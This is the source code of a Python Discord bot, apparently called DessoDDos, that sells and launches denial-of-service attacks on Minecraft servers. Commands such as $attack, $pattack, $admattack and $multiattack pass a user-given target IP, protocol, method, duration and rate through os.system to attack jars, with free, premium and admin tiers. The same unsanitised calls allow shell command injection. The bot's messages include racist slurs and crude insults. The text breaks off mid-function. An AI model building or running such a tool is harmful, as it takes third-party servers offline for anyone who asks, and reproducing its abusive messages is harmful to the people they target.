print("Loading...")

import discord
from discord.ext import commands
import os
import threading
import socket
import discord.utils
import requests
import urllib.request
import json
import time
import asyncio
import random
import sqlite3
import psutil
import mcstatus
import datetime
import getpass
import mcstatus
from discord import utils
from discord.utils import get
from psutil import Process, virtual_memory
from subprocess import Popen, TimeoutExpired, run
from discord import Member
from discord.ext.commands import has_permissions, MissingPermissions
from discord.ext import commands

decoder = json.JSONDecoder()

token = "Хуй глатни, а не токен"

methods_list = [
    'join', 'charonbot', 'localhost', 'invalidnames', 'longnames',
    'botjoiner', 'spoof', 'ping', 'multikiller', 'handshake',
    'bighandshake', 'query', 'bigpacket', 'network', 'randombytes',
    'extremejoin', 'spamjoin', 'nettydowner', 'ram', 'yoonikscry',
    'colorcrasher', 'tcphit', 'botnet', 'tcpbypass',
    'ultimatesmasher', 'sf', 'nabcry','legitnamekiller', 'SmartBot'
]
protocols_list = [
    '759', '760', '761',
    '758', '757', '757', '756', '754', '753', '751', '736', '736', '735',
    '578', '575', '573', '498', '490', '485', '480', '477', '404', '401',
    '393', '340', '338', '335'
]
starbot_channel_id = 1034174687921573978
protocols_channel_id = 1034174687921573978
methods_channel_id = 1034174687921573978
admin_channel_id = 1055547436875137104
premium_channel_id = 1062108521455439972

blocked_text = ['dsc.gg', 'dsc,gg', 'discord','https://discord.gg/', 'skybuttons.aternos.me']

black_list = ['']

betamethod_list = ['smartbot']

raffik = commands.Bot(command_prefix = ['$'], intents = discord.Intents.all())
raffik.remove_command('help')

@raffik.event
async def on_ready():
    activity = discord.Streaming(
        name="❄️DessoDDos❄️",
        url="https://www.twitch.tv/directory/game/brawlhalla") 
    await raffik.change_presence(status=discord.Status.idle, activity=activity)
    print('||| DessoDDos |||')

@raffik.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        em = discord.Embed(
            title=f"Ошибка.",
            description=f"**Команды нету, либо тебя трахают !**",
            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
    if isinstance(error, commands.MissingRequiredArgument):
        em = discord.Embed(title=f"Ошибка.",
                           description=f"**Команда отправлена неправильно !**",
                           color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)

@raffik.command(name="resolve", aliases=['ipr'])
async def resolve(ctx, arg1):
    colours = [discord.Color.dark_orange(), discord.Color.orange(), discord.Color.dark_gold(), discord.Color.gold(),
           discord.Color.dark_magenta(), discord.Color.magenta(), discord.Color.red(), discord.Color.dark_red(),
           discord.Color.blue(), discord.Color.dark_blue(), discord.Color.teal(), discord.Color.dark_teal(),
           discord.Color.green(), discord.Color.dark_green(), discord.Color.purple(), discord.Color.dark_purple()]
    url = "https://api.mcsrvstat.us/2/" + arg1
    file = urllib.request.urlopen(url)

    for line in file:
        decoded_line = line.decode("utf-8")

    json_object = json.loads(decoded_line)
    
    embed = discord.Embed(
        title="Успешно!",
        color=discord.Colour.dark_purple()
    )
    if json_object["online"] == "True":
        status = "Server off / не могу найти данные сервер выключен походу"
        embed.add_field(name='ip:', value=json_object["ip"], inline=True)
        embed.add_field(name='port:', value=json_object["port"], inline=True)
        embed.add_field(name="host:", value=json_object["hostname"], inline=True)
        embed.add_field(name="Server status:", value=f"{status}", inline=True)

        g = json_object["ip"]
        gb = json_object["port"]

        embed.set_footer(text="desso resolve")
        await ctx.send(embed=embed)
        print(f"Resolve system: Resolve ip - {arg1}")
    else:
        statas = "Включён"
        embed.add_field(name='ip:', value=json_object["ip"], inline=True)
        embed.add_field(name='port:', value=json_object["port"], inline=True)
        embed.add_field(name="Host:", value=json_object["hostname"], inline=True)
        embed.add_field(name="Server status:", value=f"{statas}", inline=True)

        g = json_object["ip"]
        gb = json_object["port"]

        embed.set_footer(text="DessoDDos resolve")
        await ctx.send(embed=embed)
        print(f"Resolve system: Resolve ip - {arg1}")

@raffik.command()
async def help(ctx):
  if ctx.message.channel.id != starbot_channel_id:
    embed = discord.Embed(title="❄️Помощь❄️", color=discord.Colour.random())
    embed.add_field(
        name='Запустить Атаку',
        value='$attack <ip:port> <protocol> <method> <time> <cps>',
        inline=False)
    embed.add_field(name=' Методы🎉(Пока что не работает)', value='$methods', inline=False)
    embed.add_field(name=' Протоколы🔒(Пока что не работает)', value='$protocols', inline=False)
    embed.add_field(name=' Узнать Айпи🌎', value='$resolve', inline=False)
    embed.add_field(name=' Добавить сервер на мониторинги', value='$addm', inline=False)
    embed.add_field(name=' stop⚡️(Пока что не работает)', value='$stop', inline=False)
    embed.add_field(name=' Узнать кто создал бота', value='$creator', inline=False)
    embed.set_footer(text='help🎯') ,
    await ctx.send(embed=embed)

@raffik.command()
async def report(ctx, *, message):
    author = ctx.author.name
    conn = sqlite3.connect('reports.db')
    c = conn.cursor()

    c.execute("INSERT INTO reports (author, message, status) VALUES (?, ?, ?)", (author, message, 'На рассмотрении'))
    conn.commit()

    await ctx.send(f'{author} Отправил репорт: {message}')

    conn.close()

@raffik.command()
async def reports(ctx):
    conn = sqlite3.connect('reports.db')
    c = conn.cursor()

    c.execute("SELECT * FROM reports")
    rows = c.fetchall()

    for row in rows:
        await ctx.send(f'#{row[0]} {row[1]}: {row[2]} ({row[3]})')

    conn.close()

@raffik.command()
async def status(ctx, id, new_status):
    conn = sqlite3.connect('reports.db')
    c = conn.cursor()

    c.execute("UPDATE reports SET status=? WHERE id=?", (new_status, id))
    conn.commit

@raffik.command()
@commands.has_role(1043094179271692318)
async def delrp(ctx, id):
    conn = sqlite3.connect('reports.db')
    c = conn.cursor()

    c.execute("SELECT * FROM reports WHERE id=?", (id,))
    report = c.fetchone()

    if report is None:
        await ctx.send(f'Репорта с айди: {id} не существует.')
    else:
        c.execute("DELETE FROM reports WHERE id=?", (id,))
        conn.commit()
        await ctx.send(f'Репорт с айди: {id} был удален навсегда.')

    conn.close()


@raffik.command()
async def protocols(ctx):
    if ctx.message.channel.id != protocols_channel_id:
        em = discord.Embed(
            title=f"DessoDDos",
            description=f"команда Работает В Канале 🎯・ddos",
            color=ctx.author.color)
        await ctx.send(embed=em)
        return
    embed = discord.Embed(title="версия - протокол",
                          color=discord.Colour.blue())
    embed.add_field(name='**1.19.3**:', value='761', inline=True)
    embed.add_field(name='**1.19.1 - 1.19.2**:', value='760', inline=True)
    embed.add_field(name='**1.19**:', value='759', inline=True)
    embed.add_field(name='**1.18.2**:', value='758', inline=True)
    embed.add_field(name='**1.18.1**:', value='757', inline=True)
    embed.add_field(name='**1.18**:', value='757', inline=True)
    embed.add_field(name='**1.17.1**:', value='756', inline=True)
    embed.add_field(name='**1.16.5**:', value='754', inline=True)
    embed.add_field(name='**1.16.3**:', value='753', inline=True)
    embed.add_field(name='**1.16.2**:', value='751', inline=True)
    embed.add_field(name='**1.16.1**:', value='736', inline=True)
    embed.add_field(name='**1.16**:', value='735', inline=True)
    embed.add_field(name='**1.15.2**:', value='578', inline=True)
    embed.add_field(name='**1.15.1**:', value='575', inline=True)
    embed.add_field(name='**1.15**:', value='573', inline=True)
    embed.add_field(name='**1.14.4**:', value='498', inline=True)
    embed.add_field(name='**1.14.3**:', value='490', inline=True)
    embed.add_field(name='**1.14.2**:', value='485', inline=True)
    embed.add_field(name='**1.14.1**:', value='480', inline=True)
    embed.add_field(name='**1.14**:', value='477', inline=True)
    embed.add_field(name='**1.13.2 (Временно не работает)**:', value='404', inline=True)
    embed.add_field(name='**1.13.1 (Временно не работает)**:', value='401', inline=True)
    embed.add_field(name='**1.13** (Временно не работает):', value='393', inline=True)
    embed.add_field(name='**1.12.2**:', value='340', inline=True)
    embed.set_footer(text="DessoDDos протоколы")
    await ctx.send(embed=embed)


@raffik.command()
async def methods(ctx):
  if ctx.message.channel.id != methods_channel_id:
        em = discord.Embed(
            title=f"DessoDDos",
            description=f"команда Работает В Канале 🎯・ddos",
            color=ctx.author.color)
        await ctx.send(embed=em)
        return
embed = discord.Embed(title="Methods", color=discord.Colour.green())
embed.add_field(name='Methods:',
                    value='б'.join([i for i in methods_list]),
                    inline=True)
embed.set_footer(text="XXXs2")


@raffik.command()
async def raffibro2020(ctx):
    if ctx.message.channel.id != starbot_channel_id:
        em = discord.Embed(title=f"Ошибка.",
                           description=f"Эта Команда работаеть В Канале 🎯・ddos",
                           color=ctx.author.color)
        await ctx.send(embed=em)
        return
    embed = discord.Embed(title="XXXs2#0682", color=discord.Colour.blue())
    embed.add_field(name='**XXXs2#0682**:',
                    value='XXXs2#0682',
                    inline=True)
    embed.set_footer(text="XXXs2#0682")
    await ctx.send(embed=embed)

@raffik.command()
async def Raffik(ctx):
    if ctx.message.channel.id != starbot_channel_id:
        em = discord.Embed(title=f"Ошибка.",
                           description=f"ты банан",
                           color=ctx.author.color)
        await ctx.send(embed=em)
        return
    embed = discord.Embed(title="XXXs2#0682,", color=discord.Colour.blue())
    embed.add_field(name='**XXXs2#0682,**:',
                    value='XXXs2#0682',
                    inline=True)
    embed.set_footer(text="XXXs2#0682")
    await ctx.send(embed=embed)

@raffik.command()
async def creator(ctx):
  if ctx.message.channel.id != starbot_channel_id:
    embed = discord.Embed(title="DessoDDos Creator", color=discord.Colour.purple())
    embed.add_field(
        name='Создатель ддоса',
        value='Ддос создал XXXs2#0682',
        inline=False)
    embed.add_field(name=' DessoDDos', value='ддос серверов майнкрафт', inline=False)
    embed.set_footer(text='Creator') ,
    await ctx.send(embed=embed)

AddMong = """
MonitoringMinecraft - Удачно
MinecraftRating - Удачно
MisterLauncher - Удачно
MinecraftStatistic - Удачно
Servera-minecraft - Удачно

Ваш сервер появился на всех мониторингах!
"""

@raffik.command(name="addm") # Help Menu
async def AddMonitoring(ctx, arg1):
    ip = f"{arg1}"
    ip1, port = ip.split(':', 1) # Разделение {ip} на айпи и порт отдельно
    requests.post('https://monitoringminecraft.ru/add-server', data={'address': ip}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
    requests.post('https://minecraftrating.ru/api/add-server/', data={'ip': ip}, headers={'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
    requests.post('https://misterlauncher.org/aapi/add_server/', data={'ip': ip}, headers={'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
    requests.post('https://minecraft-statistic.net/ru/home/add_save', data={'server_address:': ip1, 'server_port:': port}, headers={'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
    requests.post('https://servera-minecraft.net/add', data={'address': ip}, headers={'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
    await ctx.send(f'```{AddMong}```')

@raffik.command()
async def stop(ctx):

    def stop():
        os.system(f"java -jar StarDDosByraffik.jar stop")
        os.system(f"")

    embed = discord.Embed(title='DessoDDos ',
                          description=f'Атака(и) в попытки остановки by {ctx.author.mention}',
                          color=discord.Colour.blue())

@raffik.command()
async def attack(ctx, arg1, arg2, arg3, arg4, arg5):

    creator_id = 880802992998195241
    huesos_id = 1035895906538623016

    def attack():
        os.system(f"java -Xms256m -Xmx512m -jar StarDDosByraffik.jar {arg1} {arg2} {arg3} {arg4} {arg5}")
        print('Атака запущена сюда - {arg1}')

    # Определяем, является ли автор команды создателем
    is_creator = ctx.author.id == creator_id

    is_huesos = ctx.author.id == huesos_id

    embed = discord.Embed(title='DessoDDos ',
                          description=f'Атакa By {ctx.author.mention}',
                          color=discord.Colour.blue())

    embed.add_field(name='🎉𝙄𝙋:', value=f'→``{arg1}``', inline=True)
    embed.add_field(name='🔥𝙋𝙧𝙤𝙩𝙤𝙘𝙤𝙡:', value=f'→``{arg2}``', inline=True)
    embed.add_field(name='⚡️𝙈𝙚𝙩𝙝𝙤𝙙:', value=f'→``{arg3}``', inline=True)
    embed.add_field(name='🌎𝙏𝙞𝙢𝙚:', value=f'→``{arg4}``', inline=True)

    # Заменяем "Free" на "Creator", если автор является создателем
    if is_creator:
        embed.add_field(name='🌀Доступ:', value=f'→``Ｃｒｅａｔｏｒ``', inline=True)
    else:
        embed.add_field(name='🌀Доступ:', value=f'→``Ｆｒｅｅ``', inline=True)

    embed.add_field(name='🔒𝙎𝙥𝙚𝙚𝙙:', value=f'→``{arg5}``', inline=True)
    embed.set_image(
        url=
        f'https://c.tenor.com/2ASEP-BmFh0AAAAC/boom-world-explodes.gif'
    )
    embed.set_footer(text="𝔇𝔢𝔰𝔰𝔬𝔇𝔇𝔬𝔰")

    if str(arg2) not in protocols_list:
        em = discord.Embed(
            title=f"Ошибка.",
            description=
            f"**не правильный протокол! либо ты пингвин!**",
            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    if arg3 not in methods_list:
        em = discord.Embed(title=f"Ошибка.",
                           description=f"**Метод не найден либо ты страус! - $methods**",
                           color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    if ctx.message.channel.id != starbot_channel_id:
        em = discord.Embed(
            title=f"Ошибка.",
            description=f"**не тот канал #🎯・ddos .**",
            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    if int(arg4) > 60:
        em = discord.Embed(
            title=f"Ошибка.",
            description=
            f"**ты негр, используй от 1 - 60 секунд (новогодняя акция).**",
            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return
  
    if is_creator and int(arg5) > 50000:
        em = discord.Embed(
            title=f"Ошибка.",
            description=f"**ты банан, используй от 1 - 50000.**",
            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    elif not is_creator and int(arg5) > 15000:
        em = discord.Embed(
            title=f"Ошибка.",
            description=f"**ты банан, используй от 1 - 15000.**",
            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    if arg1 in black_list:
        em = discord.Embed(title=f"Ошибка.",
                           description=f"**Айпи запрещен к ддосу! Пупс сосать.**",
                           color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    if is_huesos:
        em = discord.Embed(
            title=f"Ошибка.",
            description=f"**Хуесос, соси у XXXs2 хуй тебе а не ддос.**",
            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    raffik = threading.Thread(target=attack)

    raffik.start()

    await ctx.send(embed=embed)

@raffik.command()
async def betaattack(ctx, arg1, arg2, arg3, arg4, arg5):

    creator_id = 880802992998195241

    def betaattack():
        os.system(f"java -Xms256m -Xmx512m -jar XDDOS.jar {arg1} {arg2} {arg3} {arg4} {arg5} 1100")

    # Определяем, является ли автор команды создателем
    is_creator = ctx.author.id == creator_id

    embed = discord.Embed(title='DessoDDos ',
                          description=f'Атакa By {ctx.author.mention}',
                          color=discord.Colour.blue())

    embed.add_field(name='🎉𝙄𝙋:', value=f'→``{arg1}``', inline=True)
    embed.add_field(name='🔥𝙋𝙧𝙤𝙩𝙤𝙘𝙤𝙡:', value=f'→``{arg2}``', inline=True)
    embed.add_field(name='⚡️𝙈𝙚𝙩𝙝𝙤𝙙:', value=f'→``{arg3}``', inline=True)
    embed.add_field(name='🌎𝙏𝙞𝙢𝙚:', value=f'→``{arg4}``', inline=True)

    # Заменяем "Free" на "Creator", если автор является создателем
    if is_creator:
        embed.add_field(name='🌀Доступ:', value=f'→``Ｃｒｅａｔｏｒ``', inline=True)
    else:
        embed.add_field(name='🌀Доступ:', value=f'→``Ｆｒｅｅ``', inline=True)

    embed.add_field(name='🔒𝙎𝙥𝙚𝙚𝙙:', value=f'→``{arg5}``', inline=True)
    embed.set_image(
        url=
        f'https://tenor.com/view/rainbow-line-gif-25929251'
    )
    embed.set_footer(text="𝔇𝔢𝔰𝔰𝔬𝔇𝔇𝔬𝔰")

    if str(arg2) not in protocols_list:
        em = discord.Embed(
            title=f"Ошибка.",
            description=
            f"**не правильный протокол! либо ты пингвин!**",
            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    if arg3 not in betamethod_list:
        em = discord.Embed(title=f"Ошибка.",
                           description=f"**Метод не найден либо ты страус! - $methods**",
                           color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    if ctx.message.channel.id != starbot_channel_id:
        em = discord.Embed(
            title=f"Ошибка.",
            description=f"**не тот канал #🎯・ddos .**",
            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    if int(arg4) > 60:
        em = discord.Embed(
            title=f"Ошибка.",
            description=
            f"**ты негр, используй от 1 - 60 секунд (новогодняя акция).**",
            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return
  
    if is_creator and int(arg5) > 50000:
        em = discord.Embed(
            title=f"Ошибка.",
            description=f"**ты банан, используй от 1 - 50000.**",
            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    elif not is_creator and int(arg5) > 15000:
        em = discord.Embed(
            title=f"Ошибка.",
            description=f"**ты банан, используй от 1 - 15000.**",
            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    if arg1 in black_list:
        em = discord.Embed(title=f"Ошибка.",
                           description=f"**Айпи запрещен к ддосу! Пупс сосать.**",
                           color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    raffik = threading.Thread(target=betaattack)

    raffik.start()

    await ctx.send(embed=embed)

@raffik.command()
async def pattack(ctx, arg1, arg2, arg3, arg4, arg5):
    
    def premattack():
        os.system(f"java -Xms356m -Xmx700m -jar StarDDosByraffik.jar {arg1} {arg2} {arg3} {arg4} {arg5}")
        print('Атака запущена сюда - {arg1}')

    embed = discord.Embed(title='DessoDDos ',
                          description=f'Атакa By {ctx.author.mention}',
                          color=discord.Colour.blue())

    embed.add_field(name='🎉𝙄𝙋:', value=f'{arg1}', inline=True)
    embed.add_field(name='🔥𝙋𝙧𝙤𝙩𝙤𝙘𝙤𝙡:', value=f'{arg2}', inline=True)
    embed.add_field(name='⚡️𝙈𝙚𝙩𝙝𝙤𝙙:', value=f'{arg3}', inline=True)
    embed.add_field(name='🌎𝙏𝙞𝙢𝙚:', value=f'{arg4}', inline=True)
    embed.add_field(name='🔒𝙎𝙥𝙚𝙚𝙙:', value=f'{arg5}', inline=True)
    embed.set_image(
        url=
        f'https://c.tenor.com/2ASEP-BmFh0AAAAC/boom-world-explodes.gif'
    )
    embed.set_footer(text="𝔇𝔢𝔰𝔰𝔬𝔇𝔇𝔬𝔰")

    if str(arg2) not in protocols_list:
        em = discord.Embed(
            title=f"Ошибка.",
            description=
            f"**не правильный протокол! либо ты пингвин!**",
            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    if arg3 not in methods_list:
        em = discord.Embed(title=f"Ошибка.",
                           description=f"**Метод не найден либо ты страус! - $methods**",
                           color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    if ctx.message.channel.id != starbot_channel_id:
        em = discord.Embed(
            title=f"Ошибка.",
            description=f"**не тот канал #🎯・ddos .**",
            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    if int(arg4) > 200:
        em = discord.Embed(
            title=f"Ошибка.",
            description=
            f"**ты негр, используй от 1 - 200 секунд (новогодняя акция).**",
            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    if int(arg5) > 15000 or int(arg5) < 1:
        em = discord.Embed(
            title=f"Ошибка.",
            description=
            f"**ты банан, используй от 1 - 15000.**",
            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    raffik = threading.Thread(target=premattack)

    raffik.start()

    await ctx.send(embed=embed)

@raffik.command()
async def admattack(ctx, arg1, arg2, arg3, arg4, arg5):

    def admattack():
        os.system(f"java -Xms970m -Xmx1000m -jar StarDDosByraffik.jar {arg1} {arg2} {arg3} {arg4} {arg5}")
        os.system(f"")

    embed = discord.Embed(title='DessoDDos - Admin DDos',
                          description=f'Атакa By {ctx.author.mention}',
                          color=discord.Colour.blue())

    embed.add_field(name='🎉𝙄𝙋:', value=f'{arg1}', inline=True)
    embed.add_field(name='🔥𝙋𝙧𝙤𝙩𝙤𝙘𝙤𝙡:', value=f'{arg2}', inline=True)
    embed.add_field(name='⚡️𝙈𝙚𝙩𝙝𝙤𝙙:', value=f'{arg3}', inline=True)
    embed.add_field(name='🌎𝙏𝙞𝙢𝙚:', value=f'{arg4}', inline=True)
    embed.add_field(name='      🔒𝙎𝙥𝙚𝙚𝙙:', value=f'{arg5}', inline=True)
    embed.set_image(
        url=
        f'https://c.tenor.com/2ASEP-BmFh0AAAAC/boom-world-explodes.gif'
    )
    embed.set_footer(text="𝔇𝔢𝔰𝔰𝔬𝔇𝔇𝔬𝔰")

    if str(arg2) not in protocols_list:
        em = discord.Embed(
            title=f"Ошибка.",
            description=
            f"**не правильный протокол! либо ты пингвин!**",
            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    if arg3 not in methods_list:
        em = discord.Embed(title=f"Ошибка.",
                           description=f"**Метод не найден либо ты страус! - $methods**",
                           color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    if ctx.message.channel.id != admin_channel_id:
        em = discord.Embed(
            title=f"Ошибка.",
            description=f"**не тот канал #🎯・ddos .**",
            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    if int(arg4) > 10000:
        em = discord.Embed(
            title=f"Ошибка.",
            description=
            f"**ты негр, используй от 1 - 320 секунд.**",
            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    if int(arg5) > 500000 or int(arg5) < 1:
        em = discord.Embed(
            title=f"Ошибка.",
            description=
            f"**ты банан, используй от 1 - 500000.**",
            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    raffik = threading.Thread(target=admattack)

    raffik.start()

    await ctx.send(embed=embed)

@raffik.command()
async def smartbot(ctx, arg1, arg2, arg3):

    def smartbot():
        os.system(f"java -jar ExtremeBotV2.jar {arg1} {arg2} {arg3} true true")
        os.system(f"")

    embed = discord.Embed(title='DessoDDos - Smart',
                          description=f'Атакa By {ctx.author.mention}',
                          color=discord.Colour.blue())

    embed.add_field(name='🎉айпи:', value=f'{arg1}', inline=False)
    embed.add_field(name=' 🔥Протокол:', value=f'{arg2}', inline=False)
    embed.add_field(name='  ⚡️Метод:', value=f'{arg3}', inline=False)
    embed.add_field(name='   🌎Время:', value=f'{arg4}', inline=False)
    embed.add_field(name='    🔒Скорость:', value=f'{arg5}', inline=False)
    embed.set_image(
        url=
        f'https://c.tenor.com/2ASEP-BmFh0AAAAC/boom-world-explodes.gif'
    )
    embed.set_footer(text="DessoDDos")
    url = "https://api.mcsrvstat.us/2/" + arg1
    file = urllib.request.urlopen(url)
    for line in file:
        decoded_line = line.decode("utf-8")
    json_object = json.loads(decoded_line)
    if json_object["online"] == False:
        emb = discord.Embed(color=discord.Color.red())
        emb.add_field(name='Ошибка!',
                      value='**Сервер выключен либо ты лох**')
        emb.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=emb)
        return

    if ctx.message.channel.id != admin_channel_id:
        em = discord.Embed(
            title=f"Ошибка.",
            description=f"**не тот канал #🎯・ddos .**",
            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    if int(arg3) > 500:
        em = discord.Embed(
            title=f"Ошибка.",
            description=
            f"**ты негр, используй от 1 - 500 секунд.**",
            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

@raffik.command()
async def multiattack(ctx, arg1, arg2, arg3, arg4, arg5):

    def multiattack():
        os.system(f"java -jar StarDDosByraffik.jar {arg1} {arg2} {arg3} {arg4} {arg5}")
        os.system(f"")

    def multiattack2():
        os.system(f"java -jar StarDDosByraffik.jar {arg1} {arg2} {arg3} {arg4} {arg5}")
        os.system(f"")
    def multiattack3():

        os.system(f"java -jar StarDDosByraffik.jar {arg1} {arg2} {arg3} {arg4} {arg5}")
        os.system(f"")

    embed = discord.Embed(title='DessoDDos - Premium DDos',
                          description=f'Атакa By {ctx.author.mention}',
                          color=discord.Colour.blue())

    embed.add_field(name='🎉айпи:', value=f'{arg1}', inline=False)
    embed.add_field(name=' 🔥Протокол:', value=f'{arg2}', inline=False)
    embed.add_field(name='  ⚡️Метод:', value=f'{arg3}', inline=False)
    embed.add_field(name='   🌎Время:', value=f'{arg4}', inline=False)
    embed.add_field(name='    🔒Скорость:', value=f'{arg5}', inline=False)
    embed.set_image(
        url=
        f'https://c.tenor.com/2ASEP-BmFh0AAAAC/boom-world-explodes.gif'
    )
    embed.set_footer(text="DessoDDos")
    url = "https://api.mcsrvstat.us/2/" + arg1
    file = urllib.request.urlopen(url)
    for line in file:
        decoded_line = line.decode("utf-8")
    json_object = json.loads(decoded_line)
    if json_object["online"] == False:
        emb = discord.Embed(color=discord.Color.red())
        emb.add_field(name='Ошибка!',
                      value='**Сервер выключен либо ты лох**')
        emb.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=emb)
        return

    if str(arg2) not in protocols_list:
        em = discord.Embed(
            title=f"Ошибка.",
            description=
            f"**не правильный протокол! либо ты пингвин!**",
            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    if arg3 not in methods_list:
        em = discord.Embed(title=f"Ошибка.",
                           description=f"**Метод не найден либо ты страус! - $methods**",
                           color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    if ctx.message.channel.id != premium_channel_id:
        em = discord.Embed(
            title=f"Ошибка.",
            description=f"**не тот канал #🎯・ddos .**",
            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    if int(arg4) > 100:
        em = discord.Embed(
            title=f"Ошибка.",
            description=
            f"**ты негр, используй от 1 - 100 секунд.**",
